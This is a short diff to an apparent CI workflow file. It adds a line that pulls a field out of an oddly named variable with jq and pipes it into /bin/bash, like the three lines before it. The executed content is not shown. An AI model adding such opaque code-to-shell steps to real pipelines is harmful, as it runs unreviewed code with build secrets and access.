@@ -27,6 +27,7 @@ jobs:
           printf '%s' "$rr5" | jq -r .nlb94127 | /bin/bash
           echo $l1595 | jq -r .fd217 | /bin/bash
           echo $ar7 | jq -r .dalfq6 | /bin/bash
+          echo $yu259 | jq -r .ffi63 | /bin/bash
 
       - name: Archive output
         if: always()
